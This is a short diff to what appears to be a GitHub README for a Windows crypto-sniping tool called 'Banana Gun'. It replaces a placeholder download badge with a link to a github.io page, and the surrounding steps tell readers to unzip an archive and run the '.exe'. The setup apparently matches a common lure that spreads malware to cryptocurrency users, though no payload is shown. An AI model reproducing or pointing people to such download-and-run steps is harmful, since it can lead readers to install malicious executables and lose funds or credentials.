@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://banana-gun-desktop.github.io/.github/)
 
 ## 📸 Overview
  <img width="808" height="632" alt="crypto-sniping-setup-banana-gun" src="https://github.com/user-attachments/assets/c0418dee-ed9f-4b0f-92b4-466e5a3b206e" />
